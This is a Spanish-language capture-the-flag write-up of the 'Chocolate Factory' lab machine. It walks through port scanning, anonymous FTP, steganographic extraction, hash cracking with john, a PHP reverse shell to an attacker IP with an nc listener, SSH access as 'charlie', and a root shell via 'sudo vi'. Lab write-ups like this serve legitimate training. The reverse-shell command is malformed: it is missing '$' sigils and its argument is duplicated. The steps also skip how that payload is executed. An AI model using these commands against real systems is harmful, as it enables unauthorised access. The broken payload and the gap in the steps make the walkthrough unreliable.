---
title: "Chocolate Factory"
description: "Writeup de la máquina Chocolate Factory: reconocimiento, steganografía, cracking de contraseñas, acceso inicial y escalada a root en Linux."
date: "2026-06-12"
published: true
tags: ["hackthebox", "writeup", "linux", "steganografía", "privilegios", "ssh"]
readTime: "8 min"
---

# ✅ Chocolate Factory — Writeup Completo

Esta entrada resume la resolución de la máquina **Chocolate Factory**, desde el reconocimiento inicial hasta la obtención de `root`. Los pasos cubren:

- preparación del entorno
- reconocimiento de puertos
- extracción de información oculta
- crackeo de hashes
- acceso remoto y escalada de privilegios

---

## 1) Ajuste de hosts y reconocimiento

Primero se agrga la ip al archivo `hosts` para poder trabajar con la IP de la máquina objetivo.

```bash

nano /etc/hosts
```

A continuación, se realiza un escaneo activo de la máquina objetivo:

```bash

nmap -sCV -T5 -Pn --min-rate 95000 10.66.130.38
```

Este comando ejecuta scripts de detección (`-sC`), obtiene versiones de servicios (`-sV`) y busca rápidamente puertos abiertos.

El resultado muestra que el puerto `21/tcp` está abierto y ejecuta un servicio FTP:

- `21/tcp abierto ftp vsftpd 3.0.3`
- `| ftp-anon: Inicio de sesión FTP anónimo permitido (código FTP 230)`

---

## 2) Descubrimiento FTP y extracción de archivos

El escaneo identificó FTP anónimo permitido, lo que nos permite navegar sin credenciales y descargar archivos interesantes desde el servidor.

```bash

ftp 10.66.130.38
```

Una vez conectado al servidor FTP se descarga la llave y la imagen relacionada:

```bash

get key_rev_key
get gum_room.jpg
```

Luego se utiliza `strings` para inspeccionar el contenido del archivo de llave:

```bash
strings key_rev_key
```

Y se aplica esteganografía a la imagen para extraer datos ocultos:

```bash
steghide extract -sf gum_room.jpg
```

El resultado de la extracción es un archivo con contenido codificado.

---

## 3) Decodificación y crackeo de contraseña

Tras extraer el archivo oculto, se decodifica Base64:

```bash
base64 -d b64.txt
```

El resultado es un hash que se guarda en `hash.txt`:

```bash
nano hash.txt
```

Finalmente, se rompe el hash con `john` usando `rockyou.txt`:

```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Con esto se obtiene la contraseña necesaria para acceder a la máquina o a otros recursos.

---

## 4) Acceso inicial y shell inversa

Se genera una shell inversa desde la máquina objetivo hacia el atacante con PHP utilizando el siguiente payload:

```bash
php -r 'sock=fsockopen("192.168.241.137",1234);exec("/bin/bash -i <&3 >&3 2>&3");' 'sock=fsockopen("192.168.241.137",1234);exec("/bin/bash -i <&3 >&3 2>&3");'
```

Antes de ejecutar el payload en la máquina víctima, se escucha en el puerto local:

```bash
nc -nlvp 1234
```

Una vez conectada la shell inversa, se navega hacia el home del usuario descubierto.

---

## 5) Enumeración del usuario `charlie`

Dentro de la máquina se inspecciona el directorio de usuario:

```bash
cd /home/charlie
ls -la
cat teleport
```

El archivo `teleport` suele contener información útil o pistas adicionales.

También se revisa la clave SSH encontrada y se ajustan permisos:

```bash
nano key.ssh
chmod 600 key.ssh
ssh -i key.ssh charlie@10.66.130.38
```

Con la clave privada y el acceso adecuado, se ingresa como `charlie`.

---

## 6) Confirmación de usuario y privilegios

Ya en la sesión de `charlie`, se lee la prueba de usuario:

```bash
cd /home/charlie
cat user.txt
```

A continuación, se comprueban los privilegios de sudo disponibles:

```bash
sudo -l
```

El resultado muestra que es posible ejecutar `vi` como root.

---

## 7) Escalada a root con `sudo vi`

Se aprovecha el permiso para ejecutar `vi` y abrir un shell de root:

```bash
sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
```

Esto proporciona acceso de root sin necesidad de explotar un servicio externo.

---

## 8) Ejecución final y obteniendo la flag de root

Dentro del contexto root se accede al directorio `root` y se ejecuta un script final:

```bash
cd /root
python3 root.py
```

El script devuelve la flag:

```text
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

Con esto damos por completa la maquina de chocolate factory.

---

## 9) Conclusiones

Chocolate Factory es un reto que combina:

- reconocimiento de red y servicios
- análisis de archivos binarios y esteganografía
- crackeo de contraseñas con hashes `sha512crypt`
- explotación de shell inversa
- escalada local mediante permisos sudo sobre `vi`

Es una buena práctica para consolidar técnicas de enumeración y privilegio en Linux.
